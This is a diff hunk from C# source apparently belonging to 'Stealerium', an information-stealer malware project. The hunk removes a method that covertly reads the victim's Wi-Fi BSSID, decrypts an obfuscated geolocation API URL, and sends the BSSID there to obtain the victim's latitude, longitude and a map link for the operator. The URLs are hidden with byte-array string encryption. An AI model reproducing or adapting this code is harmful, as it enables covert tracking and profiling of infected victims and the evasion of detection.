@@ -232,66 +232,6 @@ namespace Stealerium.Target.System
             return "Failed";
         }
 
-        // Get location by BSSID
-        // Example API response:
-        // {"result":200, "data":{"lat": 45.22172742372, "range": 156.997, "lon": 16.54707889397, "time": 1595238766}}
-        public static async Task<string> GetLocation()
-        {
-            string response;
-            var bssid = GetBssid(); // "00:0C:42:1F:65:E9";
-            var lat = "Unknown";
-            var lon = "Unknown";
-            var range = "Unknown";
-            // Get coordinates by bssid
-            try
-            {
-                using (var client = new HttpClient())
-                {
-                    var url = StringsCrypt.Decrypt(new byte[]
-                    {
-                        239, 87, 16, 244, 130, 200, 219, 198, 121, 223, 110, 28, 218, 166, 27, 2, 253, 239, 236, 54,
-                        11, 159, 146, 91, 205, 36, 0, 49, 166, 93, 22, 23, 221, 210, 170, 52, 17, 123, 35, 113, 33,
-                        136, 114, 109, 224, 65, 139, 150, 160, 210, 179, 207, 197, 164, 182, 82, 86, 244, 231, 174,
-                        68, 222, 51, 47
-                    }) + bssid; // https://api.mylnikov.org/geolocation/wifi?v=1.1&bssid=
-                    response = await client.GetStringAsync(url);
-                }
-            }
-            catch
-            {
-                return "BSSID: " + bssid;
-            }
-
-            // If failed to receive BSSID location
-            if (!response.Contains("{\"result\":200"))
-                return "BSSID: " + bssid;
-            // Get values
-            var index = 0;
-            var splitted = response.Split(' ');
-            foreach (var value in splitted)
-            {
-                index++; // +1
-                if (value.Contains("\"lat\":"))
-                    lat = splitted[index]
-                        .Replace(",", "");
-                if (value.Contains("\"lon\":"))
-                    lon = splitted[index]
-                        .Replace(",", "");
-                if (value.Contains("\"range\":"))
-                    range = splitted[index]
-                        .Replace(",", "");
-            }
-
-            var result = $"BSSID: {bssid}\nLatitude: {lat}\nLongitude: {lon}\nRange: {range}";
-            // Google maps
-            // https://www.google.com.ua/maps/place/
-            if (lat != "Unknown" && lon != "Unknown")
-                result +=
-                    $"\n[Open google maps]({StringsCrypt.Decrypt(new byte[] { 59, 129, 195, 34, 227, 242, 76, 173, 34, 247, 140, 112, 238, 245, 161, 60, 49, 127, 57, 59, 227, 89, 70, 152, 32, 242, 56, 102, 234, 75, 63, 18, 228, 223, 4, 147, 131, 146, 214, 158, 87, 69, 119, 232, 58, 195, 55, 105 })}{lat} {lon})";
-
-            return result;
-        }
-
         // Get CPU name
         public static string GetCpuName()
         {
